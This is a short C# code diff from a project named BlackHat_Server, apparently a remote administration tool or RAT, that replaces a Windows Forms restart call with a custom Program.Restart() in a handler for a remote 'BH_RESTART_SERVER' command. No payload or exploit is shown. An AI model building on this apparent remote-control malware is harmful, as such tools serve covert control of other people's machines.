@@ -1,5 +1,5 @@
 ﻿using System;
-using System.Windows.Forms;
+using bc.srv;
 using BlackHat_Server.Class.Comunicator;
 using BlackHat_Server.Class.Crypt;
 using BlackHat_Server.Muduli.Server_Manager;
@@ -45,7 +45,7 @@ namespace BlackHat_Server.Class
                 // COMANDO RIAVVIO SERVER                
                 case "BH_RESTART_SERVER":
                     ST_Client.Instance.Connessione.Close();
-                    Application.Restart();
+                    Program.Restart();
                     break;
 
                 // COMANDO CHIUSURA CONNESSIONE             
